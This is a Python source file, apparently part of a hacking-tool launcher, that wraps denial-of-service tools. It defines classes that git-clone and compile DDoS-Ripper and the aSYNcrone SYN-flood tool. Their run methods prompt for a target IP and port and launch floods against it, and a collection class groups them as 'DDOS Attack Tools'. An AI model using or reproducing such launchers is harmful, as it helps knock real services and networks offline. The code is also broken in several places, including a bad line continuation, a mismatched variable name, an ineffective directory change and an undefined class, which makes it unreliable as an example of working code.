# coding=utf-8
import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection


class DDoSRipper(HackingTool):
    TITLE = "DDoS-Ripper"
    DESCRIPTION = "DDos Ripper a Distributable Denied-of-Service (DDOS) attack server that cuts off targets or surrounding infrastructure in a flood of Internet traffic" \
    INSTALL_COMMANDS = ["git clone https://github.com/palahsu/DDoS-Ripper",
                       "cd DDoS-Ripper"]
    RUN_COMMANDS=["python3 DRipper.py"]

    def run(self):
        target_site = input("Enter Target IP:- ")
        subprocess.run(["DDoSRipper", target_ip])


class Asyncrone(HackingTool):
    TITLE = "Asyncrone - Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = "aSYNcrone is a C language based, mulltifunction SYN Flood " \
                  "DDoS Weapon.\nDisable the destination system by sending a " \
                  "SYN packet intensively to the destination."
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread"
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        os.system("cd aSYNcrone;")
        subprocess.run([
            "sudo", "./aSYNcrone", source_port, target_ip, target_port, 1000])







class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [
        SlowLoris(),
        Asyncrone(),
        DDoSRipper(),
    ]
